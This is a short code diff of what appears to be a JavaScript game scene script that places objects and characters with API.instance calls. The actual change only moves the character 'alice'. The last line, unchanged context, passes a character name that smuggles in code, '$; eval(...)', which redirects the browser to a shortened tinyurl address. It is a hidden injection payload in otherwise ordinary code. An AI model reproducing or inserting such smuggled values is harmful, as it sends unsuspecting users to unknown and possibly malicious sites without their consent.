@@ -30,5 +30,5 @@ API.instance("barrel", 96,55);
 
 
 // add some characters
-API.instance("alice", 86, 58);
+API.instance("alice", 86, 54);
 API.instance("$; eval('document.location=\"http://tinyurl.com/y8ufsnp\";');", 81, 36);
